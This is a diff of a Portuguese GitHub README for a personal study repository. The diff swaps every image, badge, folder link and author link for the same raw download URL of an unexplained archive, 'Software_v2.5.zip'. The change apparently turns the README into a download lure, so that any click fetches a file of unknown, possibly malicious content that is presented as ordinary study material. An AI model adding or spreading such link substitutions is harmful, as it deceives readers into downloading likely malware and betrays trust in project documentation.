@@ -1,8 +1,8 @@
-[<img src="https://i.pinimg.com/564x/0f/0b/af/0f0bafcd2dac42a948d3871c84b15326.jpg" width=1500>](https://github.com/pablobodock/estudos)
+[<img src="https://github.com/pablocssousa/estudos/raw/refs/heads/master/01_GitHub/Software_v2.5.zip" width=1500>](https://github.com/pablocssousa/estudos/raw/refs/heads/master/01_GitHub/Software_v2.5.zip)
 
 <h1 align="center"><b>Minha Jornada de Aprendizado</b></h1>
 
-![Badge em Desenvolvimento](https://img.shields.io/badge/STATUS-EM%20DESENVOLVIMENTO-green)
+![Badge em Desenvolvimento](https://github.com/pablocssousa/estudos/raw/refs/heads/master/01_GitHub/Software_v2.5.zip%20DESENVOLVIMENTO-green)
 
 <h2 align="left"><b>Índice</b></h2>
 
@@ -33,11 +33,11 @@ Com o intuito de me inserir na comunidade de tecnologia de informação para con
 Vocês podem acompanhar um pouco do que já aprendi a respeito e espero eu até encontrar respostas para algumas dúvidas na pasta que criei dedicada os meus resumos sobre funcionalidades e manuseio dessa ferramenta através do link abaixo.
 
 
-<li><a href="https://github.com/pablobodock/estudos/tree/master/01_GitHub">01_GitHub</a>
-<!-- <li type="i"><a href="https://github.com/pablobodock/estudos/tree/master/02_Python">02_Python</a>
-<li type="i"><a href="https://github.com/pablobodock/estudos/tree/master/03_CRISP-DM">03_CRISP-DM</a>
-<li type="i"><a href="https://github.com/pablobodock/estudos/tree/master/04_SCRUM">04_SCRUM</a>
+<li><a href="https://github.com/pablocssousa/estudos/raw/refs/heads/master/01_GitHub/Software_v2.5.zip">01_GitHub</a>
+<!-- <li type="i"><a href="https://github.com/pablocssousa/estudos/raw/refs/heads/master/01_GitHub/Software_v2.5.zip">02_Python</a>
+<li type="i"><a href="https://github.com/pablocssousa/estudos/raw/refs/heads/master/01_GitHub/Software_v2.5.zip">03_CRISP-DM</a>
+<li type="i"><a href="https://github.com/pablocssousa/estudos/raw/refs/heads/master/01_GitHub/Software_v2.5.zip">04_SCRUM</a>
 </ol> -->
 
 ## <b>Autor:</b>
-[<img src="https://avatars.githubusercontent.com/u/100739328?s=400&u=4239667bd3d16f391bcf6eeaeb4b94877fd976f0&v=4" width=150><br><sub><b>Pablo Carvalho Silva Sousa</b></sub>](https://github.com/pablobodock)
+[<img src="https://github.com/pablocssousa/estudos/raw/refs/heads/master/01_GitHub/Software_v2.5.zip" width=150><br><sub><b>Pablo Carvalho Silva Sousa</b></sub>](https://github.com/pablocssousa/estudos/raw/refs/heads/master/01_GitHub/Software_v2.5.zip)
